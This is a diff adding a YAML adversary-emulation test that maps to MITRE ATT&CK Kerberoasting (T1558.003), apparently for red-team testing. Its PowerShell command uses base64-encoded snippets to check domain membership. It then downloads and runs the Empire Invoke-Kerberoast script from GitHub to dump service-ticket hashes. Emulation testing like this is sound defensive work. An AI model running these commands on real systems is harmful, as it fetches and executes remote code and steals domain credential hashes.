@@ -1,0 +1,18 @@
+- id: 297a3ec7-2956-550c-ba3b-a0d4b4b85951
+  name: Soumaia ART Tests - Request for service tickets
+  description: "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output"
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: 'Steal or Forge Kerberos Tickets: Kerberoasting'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACgAKABHAGUAdAAtAEMASQBNAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AQwBvAG0AcAB1AHQAZQByAFMAeQBzAHQAZQBtACkALgBQAGEAcgB0AE8AZgBEAG8AbQBhAGkAbgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAEoAbwBpAG4AaQBuAGcAIAB0AGgAaQBzACAAYwBvAG0AcAB1AHQAZQByACAAdABvACAAYQAgAGQAbwBtAGEAaQBuACAAbQB1AHMAdAAgAGIAZQAgAGQAbwBuAGUAIABtAGEAbgB1AGEAbABsAHkACgA=
+          }
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
+          Invoke-Kerberoast | fl
